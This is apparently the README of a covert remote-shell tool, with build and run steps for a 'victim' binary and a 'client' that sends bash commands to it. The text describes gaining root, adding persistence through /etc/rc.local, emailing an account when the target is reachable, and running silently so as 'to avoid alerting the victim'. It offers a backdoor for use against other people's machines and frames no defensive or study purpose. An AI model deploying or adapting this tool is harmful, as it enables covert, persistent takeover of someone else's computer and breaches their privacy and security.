REMOTE SHELL IMPLEMENTED BY THEMBOIZ

Use the command Make to build project
Email functionality requires mailutils to be installed on the victims computer
(sudo apt-get install mailutils)
Must be run as root on first execution

Modifies /etc/rc.local to enable automatic startup on reboot
Emails a set account whenever the victim is ready for connection

To Run:
make
sudo ./victim
# this will return quickly with no output if successful. This is intentional to avoid alerting the victim

./client 
#this will allow you to send shell commands to the victim. If successful will output "success". You may then enter a bash command.

the cd command is not available because victim.c always uses its directory as the working directory. You can still access any file by giving the full path.
